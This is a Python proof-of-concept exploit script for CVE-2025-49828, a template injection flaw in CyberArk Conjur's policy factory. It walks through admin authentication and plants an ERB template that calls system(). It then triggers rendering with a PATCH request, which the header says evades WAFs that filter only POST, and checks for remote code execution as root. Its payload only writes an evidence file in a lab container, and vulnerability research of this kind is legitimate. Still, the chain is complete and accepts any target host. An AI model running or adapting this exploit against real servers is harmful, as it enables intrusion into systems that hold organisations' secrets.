#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : CyberArk Conjur SSTI to RCE — PATCH Method Vector
# CVE            : CVE-2025-49828
# Vendor         : CyberArk (Open Source)
# Product        : Conjur OSS / Secrets Manager Self-Hosted
# Affected       : Conjur OSS 1.20.1–1.21.1, SM-SH 13.1–13.4.1
# Type           : CWE-1336 - Improper Neutralization of Template Engine Elements
# CVSS           : 8.8 (HIGH)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-49828 — Vector 3: SSTI via PATCH method on factory-resources

Demonstrates that PATCH triggers the same vulnerable code path as POST.
Conjur routes.rb maps both POST and PATCH to the same 'create' action in
PolicyFactoryResourcesController — WAFs targeting only POST will miss this.

ATTACK CHAIN:
  1. Authenticate as admin via Conjur API
  2. Create a factory variable via policy load
  3. Store a malicious ERB template with system() call
  4. Trigger factory rendering via PATCH /factory-resources → RCE as root

PREREQUISITES:
  - Docker with cve-2025-49828-vulnerable container running
  - Valid Conjur API key (auto-read from bind-mounted path, or provided as arg)
  - No external dependencies (stdlib only)

REFERENCES:
  - CVE-2025-49828
  - https://github.com/cyberark/conjur/security/advisories/GHSA-93hx-v9pv-qrm4
"""

import sys
import json
import base64
import os
import time
import urllib.request
import urllib.error
import urllib.parse

# =============================================================================
# Configuration
# =============================================================================
DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 3000
ACCOUNT = "cucumber"
USERNAME = "admin"

# Paths relative to this script (bind-mounted into container at /opt/poc)
POC_DIR = os.path.dirname(os.path.abspath(__file__))
API_KEY_FILE = os.path.join(POC_DIR, ".api_key")
EVIDENCE_FILENAME = "evidence-v3.txt"
RCE_EVIDENCE_FILE_CONTAINER = f"/opt/poc/{EVIDENCE_FILENAME}"
RCE_EVIDENCE_FILE_LOCAL = os.path.join(POC_DIR, EVIDENCE_FILENAME)

# =============================================================================
# Helpers
# =============================================================================

def log(msg):
    print(f"[*] {msg}")

def success(msg):
    print(f"[+] {msg}")

def error(msg):
    print(f"[-] {msg}")

def http_request(url, method="GET", data=None, headers=None, timeout=15):
    if headers is None:
        headers = {}
    if isinstance(data, str):
        data = data.encode("utf-8")
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        body = resp.read().decode("utf-8", errors="replace")
        return resp.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        return e.code, body
    except urllib.error.URLError as e:
        error(f"Connection error: {e.reason}")
        return None, str(e.reason)

def get_api_key():
    """Read the admin API key from bind-mounted file."""
    try:
        with open(API_KEY_FILE, "r") as f:
            return f.read().strip()
    except FileNotFoundError:
        error(f"API key file not found at {API_KEY_FILE}")
        return None

def check_evidence_file():
    """Check if the RCE evidence file exists on the local filesystem (via bind mount)."""
    try:
        with open(RCE_EVIDENCE_FILE_LOCAL, "r") as f:
            return f.read().strip()
    except FileNotFoundError:
        return None

def clean_evidence_file():
    """Remove the RCE evidence file (local filesystem via bind mount)."""
    try:
        os.remove(RCE_EVIDENCE_FILE_LOCAL)
    except FileNotFoundError:
        pass

# =============================================================================
# Exploit
# =============================================================================

def authenticate(base_url, api_key):
    url = f"{base_url}/authn/{ACCOUNT}/{USERNAME}/authenticate"
    status, body = http_request(url, method="POST", data=api_key)
    if status != 200:
        error(f"Authentication failed (HTTP {status})")
        return None
    token = base64.b64encode(body.encode("utf-8")).decode("utf-8")
    success("Authenticated successfully")
    return token

def auth_header(token):
    return {"Authorization": f'Token token="{token}"'}

def load_factory_policy(base_url, token):
    """Create factory variable for vector 3."""
    log("Loading factory policy for PATCH vector...")
    policy = """- !policy
  id: conjur
  body:
  - !policy
    id: factories
    body:
    - !policy
      id: core
      body:
      - !variable v1/evil3
"""
    url = f"{base_url}/policies/{ACCOUNT}/policy/root"
    headers = auth_header(token)
    headers["Content-Type"] = "text/plain"
    status, body = http_request(url, method="POST", data=policy, headers=headers)
    if status in (200, 201):
        success(f"Factory policy loaded (HTTP {status})")
        return True
    error(f"Policy load failed (HTTP {status}): {body}")
    return False

def store_malicious_factory(base_url, token):
    """Store factory with ERB payload in both policy and policy_branch."""
    log("Storing malicious factory for PATCH method test...")

    rce_command = f"id > {RCE_EVIDENCE_FILE_CONTAINER} && echo VECTOR3-PATCH-METHOD >> {RCE_EVIDENCE_FILE_CONTAINER} && date >> {RCE_EVIDENCE_FILE_CONTAINER}"
    malicious_policy = f"<%= system('{rce_command}') %>\n- !policy\n  id: <%- id -%>"
    policy_b64 = base64.b64encode(malicious_policy.encode("utf-8")).decode("utf-8")

    factory = {
        "version": "v1",
        "policy": policy_b64,
        "policy_branch": "<%= branch %>",
        "schema": {
            "$schema": "http://json-schema.org/draft-06/schema#",
            "title": "Evil Factory v3",
            "type": "object",
            "properties": {
                "id": {"type": "string"},
                "branch": {"type": "string"}
            },
            "required": ["branch", "id"]
        }
    }

    factory_json = json.dumps(factory)
    factory_b64 = base64.b64encode(factory_json.encode("utf-8")).decode("utf-8")

    variable_id = urllib.parse.quote("conjur/factories/core/v1/evil3", safe="")
    url = f"{base_url}/secrets/{ACCOUNT}/variable/{variable_id}"
    headers = auth_header(token)

    status, body = http_request(url, method="POST", data=factory_b64, headers=headers)
    if status in (200, 201):
        success("Factory stored for PATCH vector")
        return True
    error(f"Store failed (HTTP {status}): {body}")
    return False

def trigger_factory_via_patch(base_url, token):
    """
    Trigger factory rendering using PATCH instead of POST.

    routes.rb line 68:
      match "/factory-resources/:account/:kind/(:version)/:id" =>
        "policy_factory_resources#create", via: [:post, :patch]

    Both HTTP methods hit the same controller action and vulnerable code path.
    """
    log("Triggering factory via PATCH method (not POST)...")

    url = f"{base_url}/factory-resources/{ACCOUNT}/core/v1/evil3"
    headers = auth_header(token)
    headers["Content-Type"] = "application/json"
    payload = json.dumps({"id": "pwned3", "branch": "root"})

    # Use PATCH instead of POST
    status, body = http_request(url, method="PATCH", data=payload, headers=headers)
    log(f"  PATCH response: HTTP {status}")
    if body:
        display = body[:300] + "..." if len(body) > 300 else body
        log(f"  Response: {display}")
    return True

def verify_rce():
    log(f"Checking for RCE evidence ({EVIDENCE_FILENAME})...")
    time.sleep(1)

    content = check_evidence_file()
    if content:
        success("=" * 60)
        success("RCE CONFIRMED via PATCH method! Evidence:")
        success("=" * 60)
        for line in content.split("\n"):
            success(f"  {line}")
        success("=" * 60)
        return True
    else:
        error(f"Evidence file not found")
        return False

def exploit(target_host, target_port, api_key=None):
    base_url = f"http://{target_host}:{target_port}"
    log(f"Target: {base_url}")
    log(f"CVE: CVE-2025-49828 — SSTI via ERB in Conjur Policy Factory")
    log(f"Vector 3: PATCH method triggers same vulnerable code path as POST")
    print()

    if not api_key:
        log("Reading API key from bind-mounted path...")
        api_key = get_api_key()
        if not api_key:
            error("Could not obtain API key")
            return False
        success(f"Got API key: {api_key[:8]}...")
    print()

    clean_evidence_file()

    token = authenticate(base_url, api_key)
    if not token:
        return False
    print()

    if not load_factory_policy(base_url, token):
        return False
    print()

    if not store_malicious_factory(base_url, token):
        return False
    print()

    trigger_factory_via_patch(base_url, token)
    print()

    rce_confirmed = verify_rce()
    print()

    if rce_confirmed:
        success("VECTOR 3 EXPLOIT SUCCESSFUL — PATCH method also vulnerable")
        return True
    else:
        error("VECTOR 3 EXPLOIT FAILED")
        return False

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    key = sys.argv[3] if len(sys.argv) > 3 else None

    result = exploit(target, port, key)
    sys.exit(0 if result else 1)
